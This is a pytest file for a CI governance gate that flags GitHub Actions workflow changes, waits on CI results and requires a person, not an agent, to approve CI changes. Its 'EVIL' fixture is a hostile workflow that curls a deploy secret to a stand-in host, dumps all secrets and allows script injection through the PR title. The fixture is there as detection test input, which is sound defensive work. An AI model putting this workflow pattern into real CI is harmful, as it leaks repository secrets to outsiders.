"""GitHub Actions CI, governed (services/ci_gate.py) — the parts that need no database.

  * a change under .github/workflows/ is detected and flagged "CI changed", and needs a person;
  * the deterministic workflow checks find secret exfiltration, pull_request_target checking out
    the PR head, unpinned actions and script injection — in the reviewer's own FINDING contract,
    so the gate and the PR read them even when the model reviewer is scripted;
  * the adversarial reviewer is handed the workflow checklist whenever the change touches CI;
  * wait-for-CI against fake GitHub responses: pass, fail (named, linked), pending -> timeout,
    no checks at all (no CI configured vs CI configured), with backoff polling;
  * the approval gate refuses an agent, a policy and a run token on a CI change, and refuses a
    deploy while CI failed.
"""
from __future__ import annotations

from types import SimpleNamespace

import pytest

from boss_engine.services import ci_gate, review_comments
from boss_engine.services import governed_code_task_service as gcts

PINNED = "8f152de45cc393bb48ce5d89d36b731f54556e65"

SAFE = f"""name: ci
on: [pull_request]
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@{PINNED}  # v4
      - uses: ./.github/actions/local
      - run: |
          npm ci
          npm test
        env:
          TOKEN: ${{{{ secrets.NPM_TOKEN }}}}
"""

EVIL = """name: release
on:
  pull_request_target:
jobs:
  go:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: curl -d "${{ secrets.DEPLOY_KEY }}" https://collector.example/x
      - run: echo "${{ toJSON(secrets) }}"
      - run: |
          echo "building ${{ github.event.pull_request.title }}"
"""


# ---- detection ---------------------------------------------------------------------------------

def test_a_change_under_github_workflows_is_detected_and_nothing_else_is():
    assert ci_gate.workflow_paths(["src/app.py", "./.github/workflows/ci.yml", ".github/dependabot.yml",
                                   "/.github/workflows/release.yaml", ".github/workflows/"]) == [
        ".github/workflows/ci.yml", ".github/workflows/release.yaml"]
    assert ci_gate.workflow_changes([{"path": "a.py", "content": "x"}]) == {}
    files = [SimpleNamespace(path=".github/workflows/ci.yml", content=SAFE),
             SimpleNamespace(path="app.py", content="print(1)")]
    ev = ci_gate.ci_changed_evidence(files)
    assert ev["ci_changed"] is True and ev["requires_person_approval"] is True
    assert ev["ci_changed_files"] == [".github/workflows/ci.yml"]
    assert "A person must approve" in ev["ci_changed_note"]
    assert ci_gate.ci_changed_evidence(files[1:]) == {}


def test_the_pull_request_says_ci_changed_with_the_static_findings():
    findings = ci_gate.static_findings(".github/workflows/release.yml", EVIL)
    body = ci_gate.ci_changed_comment([".github/workflows/release.yml"], findings)
    assert body.startswith("**CI changed**")
    assert "person's approval" in body and "BLOCKER" in body
    clean = ci_gate.ci_changed_comment([".github/workflows/ci.yml"], [])
    assert "nothing found" in clean


# ---- static checks -----------------------------------------------------------------------------

def _by_check(findings):
    out: dict[str, list] = {}
    for f in findings:
        out.setdefault(f.check, []).append(f)
    return out


def test_a_safe_pinned_workflow_has_no_findings():
    assert ci_gate.static_findings(".github/workflows/ci.yml", SAFE) == []


def test_the_static_checks_find_each_attack_with_its_line():
    found = _by_check(ci_gate.static_findings(".github/workflows/release.yml", EVIL))
    prt = found["pull_request_target"]
    assert [(f.severity, f.line) for f in prt] == [("blocker", 10)]
    exfil = found["secret_exfiltration"]
    assert {f.line for f in exfil} == {11, 12} and {f.severity for f in exfil} == {"blocker"}
    assert [(f.severity, f.line) for f in found["unpinned_action"]] == [("minor", 8)]
    assert "actions/checkout@v4" in found["unpinned_action"][0].message
    assert [(f.severity, f.line) for f in found["script_injection"]] == [("major", 14)]


def test_a_secret_in_a_run_step_of_an_untrusted_trigger_is_exfiltration():
    wf = ("on: workflow_run\njobs:\n  a:\n    steps:\n"
          "      - run: ./deploy.sh ${{ secrets.TOKEN }}\n")
    assert [f.check for f in ci_gate.static_findings(".github/workflows/x.yml", wf)] == [
        "secret_exfiltration"]
    same_on_pr = wf.replace("workflow_run", "pull_request")
    assert ci_gate.static_findings(".github/workflows/x.yml", same_on_pr) == []


def test_the_findings_use_the_reviewers_contract_so_the_gate_and_the_pr_read_them():
    block = ci_gate.findings_block(ci_gate.static_findings(".github/workflows/release.yml", EVIL))
    parsed = review_comments.parse_findings(block, stage="review_code")
    assert {(c.severity, c.path, c.line) for c in parsed} >= {
        ("blocker", ".github/workflows/release.yml", 10),
        ("blocker", ".github/workflows/release.yml", 11),
        ("minor", ".github/workflows/release.yml", 8)}
    # A blocker sinks the review gate even when the (scripted) model said SURVIVED.
    passed, blocking, _ = gcts._review_gate_from_findings(  # noqa: SLF001
        "Looks fine.\nVERDICT: SURVIVED" + block, "survived")
    assert passed is False and any(f["path"] == ".github/workflows/release.yml" for f in blocking)


def test_static_findings_are_added_to_a_scripted_reviewers_summary():
    rr = {"summary": "VERDICT: SURVIVED", "cost_usd_micros": 1}
    files = {".github/workflows/release.yml": EVIL, "app.py": "x"}
    out = gcts._with_ci_static(rr, files)  # noqa: SLF001
    assert "[ci:pull_request_target]" in out["summary"] and out["cost_usd_micros"] == 1
    assert gcts._with_ci_static(rr, {"app.py": "x"}) is rr  # noqa: SLF001


def test_the_adversarial_reviewer_gets_the_workflow_checklist_only_for_a_ci_change():
    with_ci = gcts._review_prompt("t", ["c"], change="--- .github/workflows/ci.yml\n+on: push")  # noqa: SLF001
    without = gcts._review_prompt("t", ["c"], change="--- app.py\n+x = 1")  # noqa: SLF001
    for needle in ("SECRET EXFILTRATION", "pull_request_target", "40-character commit SHA"):
        assert needle in with_ci and needle not in without


# ---- waiting for CI against fake GitHub ----------------------------------------------------------

class FakeCi:
    """GitHub's check-runs and combined-status answers, one per look."""

    def __init__(self, looks, statuses=None, has_workflows=True):
        self.looks = list(looks)
        self.status_looks = list(statuses or [])
        self.workflows = has_workflows
        self.calls = 0

    def check_runs(self, sha):
        self.calls += 1
        return self.looks.pop(0) if len(self.looks) > 1 else self.looks[0]

    def statuses(self, sha):
        if not self.status_looks:
            return []
        return self.status_looks.pop(0) if len(self.status_looks) > 1 else self.status_looks[0]

    def has_workflows(self, sha):
        return self.workflows


class Clock:
    def __init__(self):
        self.t = 0.0
        self.slept: list[float] = []

    def __call__(self):
        return self.t

    def sleep(self, s):
        self.slept.append(s)
        self.t += s


def _run(id_, name, status="completed", conclusion="success", url=None):
    return {"id": id_, "name": name, "status": status, "conclusion": conclusion,
            "html_url": url or f"https://github.test/acme/web/runs/{id_}"}


def _wait(reader, clock, **kw):
    return ci_gate.wait_for_ci(reader, "a" * 40, sleep=clock.sleep, clock=clock, **kw)


def test_ci_passed_after_pending_with_backoff():
    clock = Clock()
    reader = FakeCi([
        [],
        [_run(1, "unit-tests", "in_progress", None), _run(2, "lint")],
        [_run(1, "unit-tests"), _run(2, "lint"), _run(3, "build")],
    ], statuses=[[], [], [{"context": "ci/external", "state": "success"}]])
    out = _wait(reader, clock, timeout_seconds=1800)
    assert out.state == "passed" and out.summary == "CI passed: 4 checks"
    assert clock.slept[:2] == [10.0, 15.0]          # backoff: 10 s, then x1.5


def test_ci_failed_names_the_check_and_links_it():
    clock = Clock()
    reader = FakeCi([[_run(1, "lint"), _run(7, "unit-tests", conclusion="failure",
                                            url="https://github.test/acme/web/runs/7")]])
    out = _wait(reader, clock, timeout_seconds=1800)
    assert out.state == "failed"
    assert out.summary == "CI failed: 'unit-tests' failed — https://github.test/acme/web/runs/7"
    assert out.failing_url == "https://github.test/acme/web/runs/7" and out.failing == ["unit-tests"]


def test_a_rerun_check_counts_by_its_latest_run():
    checks = ci_gate.normalise([_run(1, "unit-tests", conclusion="failure"), _run(9, "unit-tests")], [])
    assert ci_gate.evaluate(checks).state == "passed"


def test_a_failed_commit_status_fails_ci():
    out = ci_gate.evaluate(ci_gate.normalise([], [{"context": "circleci", "state": "failure",
                                                   "target_url": "https://ci.test/1"}]))
    assert out.state == "failed" and "https://ci.test/1" in out.summary


def test_pending_until_the_timeout_says_ci_did_not_finish():
    clock = Clock()
    reader = FakeCi([[_run(1, "e2e", "in_progress", None, url="https://github.test/r/1")]])
    out = _wait(reader, clock, timeout_seconds=1800)
    assert out.state == "timed_out"
    assert out.summary.startswith("CI did not finish in 30 min: 'e2e' still running")
    assert clock.t == pytest.approx(1800) and max(clock.slept) <= ci_gate.MAX_POLL_SECONDS


def test_no_checks_on_a_repo_with_ci_configured_is_not_a_pass():
    clock = Clock()
    out = _wait(FakeCi([[]], has_workflows=True), clock, timeout_seconds=600)
    assert out.state == "timed_out"
    assert out.summary == "CI did not finish in 10 min: no checks were reported for this commit."
    assert out.state not in ci_gate.CLEARED


def test_no_checks_on_a_repo_with_no_ci_says_so_and_does_not_block():
    clock = Clock()
    out = _wait(FakeCi([[]], has_workflows=False), clock, timeout_seconds=1800,
                repository="acme/web")
    assert out.state == "no_ci" and out.state in ci_gate.CLEARED
    assert out.summary.startswith("No CI is configured for acme/web")
    assert clock.t >= ci_gate.NO_CI_GRACE_SECONDS and clock.t < 1800


def test_a_flaky_read_is_retried_never_a_pass():
    class Flaky(FakeCi):
        def check_runs(self, sha):
            self.calls += 1
            if self.calls == 1:
                raise RuntimeError("502")
            return [_run(1, "unit-tests")]
    clock = Clock()
    out = _wait(Flaky([[]]), clock, timeout_seconds=1800)
    assert out.state == "passed" and clock.slept == [10.0]


# ---- the approval gate ---------------------------------------------------------------------------

class NoDb:
    """A connection with nothing recorded: no members, no CI waits, no other decisions."""

    def execute(self, *_a, **_k):
        raise RuntimeError("no database in this test")


def _decision(**rec):
    return {"id": "dec_1", "project_id": "p1", "recommendation": rec}


CI_CHANGED = dict(action="review_pull_request", pull_request_url="https://github.test/a/b/pull/3",
                  ci_changed=True, ci_changed_files=[".github/workflows/ci.yml"],
                  requires_person_approval=True)


@pytest.mark.parametrize("actor", ["agt_builder", "agent:release_manager", "auto_approval",
                                   "workflow", "boss", ""])
def test_an_agent_or_automatic_actor_cannot_approve_a_ci_change(actor):
    with pytest.raises(ci_gate.CiGateRefused) as refused:
        ci_gate.refuse_approval(NoDb(), _decision(**CI_CHANGED), actor)
    assert refused.value.code == "person_approval_required"
    assert "Only a person" in refused.value.message


def test_a_policy_cannot_approve_a_ci_change_even_as_a_person():
    with pytest.raises(ci_gate.CiGateRefused):
        ci_gate.refuse_approval(NoDb(), _decision(**CI_CHANGED), "ceo", system_policy=True)


def test_a_run_token_or_an_api_key_cannot_approve_a_ci_change():
    run_token = SimpleNamespace(run_token=object(), credential=None, legacy=None,
                                is_human_session=False, principal=SimpleNamespace(id="agt_x"))
    key = SimpleNamespace(run_token=None, credential=object(), legacy=None,
                          is_human_session=False, principal=SimpleNamespace(id="usr_x"))
    for ctx in (run_token, key):
        with pytest.raises(ci_gate.CiGateRefused):
            ci_gate.refuse_approval(NoDb(), _decision(**CI_CHANGED), "ceo", identity_ctx=ctx)


def test_a_person_may_approve_a_ci_change():
    person = SimpleNamespace(run_token=None, credential=None, legacy=None, is_human_session=True,
                             principal=SimpleNamespace(id="usr_alice"))
    ci_gate.refuse_approval(NoDb(), _decision(**CI_CHANGED), "ceo", identity_ctx=person)


def test_an_ordinary_change_is_not_gated():
    ci_gate.refuse_approval(NoDb(), _decision(action="review_pull_request"), "agt_builder")
    ci_gate.refuse_approval(NoDb(), _decision(action="governance_review"), "agt_builder")


def test_a_deploy_is_refused_while_ci_failed(monkeypatch):
    failed = {"id": "ciw_1", "status": "failed", "failing_url": "https://github.test/r/7",
              "summary": "CI failed: 'unit-tests' failed — https://github.test/r/7"}
    monkeypatch.setattr(ci_gate, "latest_wait", lambda *a, **k: failed)
    with pytest.raises(ci_gate.CiGateRefused) as refused:
        ci_gate.refuse_approval(NoDb(), _decision(action="review_deployment",
                                                  pull_request_url="https://github.test/a/b/pull/3"),
                                "ceo")
    assert refused.value.code == "ci_not_passed"
    assert "https://github.test/r/7" in refused.value.message
    assert "deploy cannot be approved" in refused.value.message
    with pytest.raises(ci_gate.CiGateRefused):     # and at the effect itself
        ci_gate.refuse_effect(NoDb(), "p1", {**_decision(action="review_deployment",
                                                         pull_request_url="x"), "approved_by": "ceo"})
    # A person may still force the MERGE (with a note, decisions.transition); never the deploy.
    ci_gate.refuse_approval(NoDb(), _decision(action="review_pull_request", pull_request_url="x"),
                            "ceo", force=True)
    monkeypatch.setattr(ci_gate, "latest_wait", lambda *a, **k: {**failed, "status": "passed"})
    ci_gate.refuse_approval(NoDb(), _decision(action="review_deployment", pull_request_url="x"),
                            "ceo")


def test_the_merge_effect_refuses_an_approval_that_was_not_a_persons():
    with pytest.raises(ci_gate.CiGateRefused):
        ci_gate.refuse_effect(NoDb(), "p1", {**_decision(**CI_CHANGED), "approved_by": "auto_approval"})
    ci_gate.refuse_effect(NoDb(), "p1", {**_decision(**CI_CHANGED), "approved_by": "ceo"})


# ---- the opt-in link and the workflow step ------------------------------------------------------

def test_the_permissions_link_names_the_apps_own_page():
    org = ci_gate.permissions_link({"slug": "boss-x", "account_login": "acme",
                                    "installation_id": "42"}, "https://github.com")
    assert org["permissions_url"] == "https://github.com/organizations/acme/settings/apps/boss-x/permissions"
    assert org["permissions_url_personal"] == "https://github.com/settings/apps/boss-x/permissions"
    assert org["installation_url"] == "https://github.com/organizations/acme/settings/installations/42"
    none = ci_gate.permissions_link({}, "https://github.com")
    assert none["permissions_url"] is None and "Workflows" in none["note"]


def test_wait_for_ci_is_a_selectable_awaited_workflow_step():
    from boss_engine.services import workflow_capabilities as wc
    from boss_engine.services import workflow_capability_runner as runner
    from boss_engine.services import workflow_outcomes

    cap = wc.get("wait_for_ci")
    assert cap.is_async and cap.tool is None and cap.risk_tier == 0
    assert "wait_for_ci" in {c["key"] for c in wc.palette()}
    assert runner._AWAIT_KINDS["wait_for_ci"][0] == "ci_wait"  # noqa: SLF001
    table, ok, bad = runner._AWAIT_TABLES["ci_wait"]  # noqa: SLF001
    assert table == "ci_waits" and ok == {"passed", "no_ci"} and bad == {"failed", "timed_out", "cancelled"}
    assert workflow_outcomes.judge("wait_for_ci", {"status": "awaiting",
                                                   "await": {"kind": "ci_wait", "id": "x"}}, {}).outcome \
        == "awaiting"


def test_the_pull_request_is_labelled_and_commented_ci_changed():
    """software_factory.propose_pull_request -> _flag_ci_changed: on the PR itself."""
    from boss_engine.services.software_factory import SoftwareFactoryService

    calls: list = []

    class Github:
        repository_full_name = "acme/web"

        def create_issue_comment(self, number, body):
            calls.append(("comment", number, body))

        def _request(self, method, path, body=None, **_k):
            calls.append((method, path, body))

    events: list = []
    sf = object.__new__(SoftwareFactoryService)
    sf.github = Github()
    sf.events = SimpleNamespace(emit=lambda *a: events.append(a))
    ev = ci_gate.ci_changed_evidence([{"path": ".github/workflows/release.yml", "content": EVIL}])
    sf._flag_ci_changed(object(), "p1", 12, "https://github.test/acme/web/pull/12", ev, "rcpt_1")  # noqa: SLF001
    comment = next(c for c in calls if c[0] == "comment")
    assert comment[1] == 12 and comment[2].startswith("**CI changed**") and "BLOCKER" in comment[2]
    assert ("POST", "/repos/acme/web/issues/12/labels", {"labels": ["CI changed"]}) in calls
    (event,) = events
    assert event[2] == "software_factory.ci_changed" and event[6]["comment"] is True
    assert event[6]["label"] is True and event[6]["files"] == [".github/workflows/release.yml"]
